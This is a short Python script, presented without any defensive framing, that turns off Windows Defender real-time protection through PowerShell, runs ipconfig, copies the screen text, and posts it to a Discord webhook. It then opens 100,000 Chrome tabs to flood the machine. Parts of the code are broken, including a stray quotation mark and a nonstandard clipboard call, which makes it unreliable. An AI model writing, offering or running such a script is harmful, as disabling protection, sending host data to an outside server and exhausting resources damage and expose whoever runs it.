this script turns off real time protection using power shell, opens command prompt and runs ipconfig, copys all of the text and sends it to a discord server via webhook
import subprocess
import pyautogui
import time
import requests

ps_command = 'Set-MpPreference -DisableRealtimeMonitoring $true'
try:
    subprocess.run(["powershell", "-Command", ps_command], check=True)
    print("Windows Defender Real-Time Protection has been disabled.")
except subprocess.CalledProcessError as e:
    print(f"An error occurred while disabling Defender: {e}")

try:
    subprocess.run("ipconfig", check=True, shell=True)
    print("ipconfig command executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"An error occurred while running ipconfig: {e}")

time.sleep(2)

pyautogui.hotkey('ctrl', 'a')
time.sleep(0.5)

pyautogui.hotkey('ctrl', 'c')
time.sleep(1)

copied_text = pyautogui.getClipboard()

webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
data = {
    "content": copied_text
}

try:
    response = requests.post(webhook_url, json=data)
    response.raise_for_status()
    print("Text sent to Discord successfully.")
except requests.exceptions.RequestException as e:
    print(f"An error occurred while sending to Discord: {e}")

chrome_path = "C:/Program Files/Google/Chrome/Application/chrome.exe"
url = "https://www.example.com"

num_tabs = 100000 '
for _ in range(num_tabs):
    subprocess.Popen([chrome_path, url])
    time.sleep(0.1)

print(f"Opened {num_tabs} tabs in Chrome.")

